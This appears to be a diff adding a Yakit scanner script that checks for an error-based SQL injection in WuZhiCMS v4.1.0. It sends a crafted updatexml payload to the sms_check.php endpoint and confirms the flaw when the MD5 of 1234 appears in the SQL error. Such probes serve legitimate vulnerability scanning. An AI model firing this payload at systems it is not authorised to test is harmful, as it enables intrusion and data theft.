@@ -1,0 +1,57 @@
+yakit.AutoInitYakit()
+
+handleCheck = func(target,port){
+    var url
+    addr = str.HostPort(target, port)
+    isTls = str.IsTLSServer(addr)
+    level=["","low","middle","high","critical"]
+    if isTls {
+        url="https://"+addr
+    }else{
+        url="http://"+addr
+    }
+    vulnable=false
+
+    reference="wuzhicms v410 sqli 漏洞"
+    severity=""
+    type=""
+
+    poc_url_r0= url + `/api/sms_check.php?param=1%27%20and%20updatexml(1,concat(0x7e,(SELECT%20MD5(1234)),0x7e),1)--%20`
+    req_r0, _ := http.NewRequest("GET",poc_url_r0)
+    breq,_=http.dump(req_r0)
+    resp_r0, _ := http.Do(req_r0,)
+    bresp,_=http.dump(resp_r0)
+    header, body = poc.Split(bresp)
+    r0_flag = false
+    if resp_r0.StatusCode == 200 && str.Contains(string(body),"81dc9bdb52d04dc20036dbd8313ed05") && str.Contains(string(body),"sql_error"){
+	r0_flag = true
+    }
+
+    poc_url=poc_url_r0
+    if r0_flag{
+	vulnable = true
+    }
+    if vulnable {
+            yakit.Info("FOUND INFO for %v", type)
+            risk.NewRisk(
+                url, risk.severity(severity), 
+                risk.title(sprintf("FOUND %v", type)),
+                risk.titleVerbose(sprintf("%v", reference)),
+                risk.type(type), risk.typeVerbose(type),
+                risk.details({
+                    "request": breq,
+                    "response": bresp,
+                    "url": poc_url,
+                }),
+            )
+        }
+    return
+}
+handle = func(result) {
+    if !result.IsOpen(){
+        return
+    }
+    if len(result.Fingerprint.HttpFlows)>0{
+        handleCheck(result.Target,result.Port)
+    }
+}
